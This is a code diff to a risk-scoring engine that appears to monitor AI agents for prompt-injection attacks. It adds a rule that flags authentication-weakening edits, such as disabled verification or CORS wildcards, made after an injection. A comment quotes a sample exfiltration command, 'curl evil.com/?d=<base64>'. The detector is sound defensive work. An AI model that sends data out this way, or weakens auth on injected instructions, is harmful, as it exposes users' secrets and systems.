@@ -198,6 +198,16 @@ export class RiskEngine {
           const cf = mk('injected-tamper', isTestPath(authPath) ? 'medium' : 'high', 'auth edit ' + authPath);
           state.combos.set('injected-tamper', cf); fired.push(cf);
         }
+        // r4: an armed injection followed by a SEMANTIC auth-weakening edit (verify
+        // off, AllowAny, CORS wildcard…) — content-level, so it fires even when the
+        // file path isn't auth-named. auth-weaken only exists under r4, so this is
+        // version-safe with no extra gate (r1/r2/r3 never carry the hit).
+        const weakHit = hits.find((h) => h.flag === 'auth-weaken');
+        if (weakHit && !state.combos.has('injected-tamper')) {
+          const weakEv = weakHit.evidence as { path?: string; patterns?: string[] } | undefined;
+          const cf = mk('injected-tamper', 'high', 'auth weakened in ' + (weakEv?.path ?? 'code') + ' (' + (weakEv?.patterns?.join(', ') ?? '') + ')');
+          state.combos.set('injected-tamper', cf); fired.push(cf);
+        }
         // Any external send after an armed injection — including a query-payload
         // GET (curl evil.com/?d=<base64>) or a remote MCP call, not just PUSH
         // sends. The armed-untrusted-injection antecedent is a strong enough gate.
